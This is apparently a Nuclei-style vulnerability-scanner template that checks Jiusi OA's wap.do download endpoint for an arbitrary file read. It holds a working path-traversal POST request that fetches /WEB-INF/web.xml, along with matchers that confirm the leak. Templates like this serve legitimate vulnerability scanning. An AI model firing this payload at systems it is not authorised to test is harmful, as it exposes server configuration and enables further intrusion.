id: poc-yaml-jiusi-oa-wap-fildread
info:
  name: Jiusi-OA Wap.do Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read,jiusi-oa
http:
  - raw:
      - |
        POST /jsoa/wap.do?method=downLoad HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        path=../&name=&FileName=/WEB-INF/web.xml
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<?xml version"
          - "<param-value>"
          - "<servlet-name>"
      - type: regex
        part: body
        regex:
          - "<filter-class>(.*)</filter-class>"
          - "<servlet-class>(.*)</servlet-class>"
          - "/WEB-INF/(.*).xml"
      - type: word
        part: body
        negative: true
        words:
          - "<html>"
